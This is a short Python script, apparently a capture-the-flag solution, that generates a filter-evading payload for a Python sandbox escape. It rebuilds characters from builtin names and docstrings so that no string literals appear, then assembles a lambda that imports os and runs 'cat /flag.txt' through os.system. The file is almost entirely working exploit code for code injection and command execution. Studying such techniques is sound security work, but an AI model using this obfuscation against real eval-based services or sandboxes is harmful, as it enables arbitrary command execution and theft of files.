
def generator(cmd):
    """
    head -c 1 /flag.txt
    h=hash.__name__.__getitem__(0)
    e=eval.__name__.__getitem__(0)
    a=abs.__name__.__getitem__(0)
    d=divmod.__name__.__getitem__(0)
    space=str(hash).__getitem__(9)
    dash=str(hash).__getitem__(6)
    dot=hash.__doc__.__getitem__(151)
    one=dict.__doc__.__getitem__(361)
    slash=divmod.__doc__.__getitem__(20)

    etc.
    """
    
    mapping = {
        'o': "open.__name__.__getitem__(0)",
        's': "set.__name__.__getitem__(0)",
        'c': "chr.__name__.__getitem__(0)",
        'h': "hash.__name__.__getitem__(0)",
        'e': "eval.__name__.__getitem__(0)",
        'a': "abs.__name__.__getitem__(0)",
        'd': "divmod.__name__.__getitem__(0)",
        'f': "float.__name__.__getitem__(0)",
        'l': "list.__name__.__getitem__(0)",
        'g': "globals.__name__.__getitem__(0)",
        't': "type.__name__.__getitem__(0)",
        'x': "hex.__name__.__getitem__(2)",
        ' ': "str(hash).__getitem__(9)",
        '-': "str(hash).__getitem__(6)",
        '.': "hash.__doc__.__getitem__(151)",
        '1': "dict.__doc__.__getitem__(361)",
        '/': "divmod.__doc__.__getitem__(20)",
    }
    for k,v in mapping.items():
        assert(k == eval(v))
    
    payload=''
    for ch in cmd:
        encoded_ch = mapping[ch]
        if len(payload) == 0:
            payload = encoded_ch
        else:
            payload += '.__add__(' + encoded_ch + ')'
    assert(eval(payload) == cmd)
    return payload

horse = f"(lambda:__builtins__.__import__({generator('os')}).system({generator('cat /flag.txt')}))()"
print(horse)
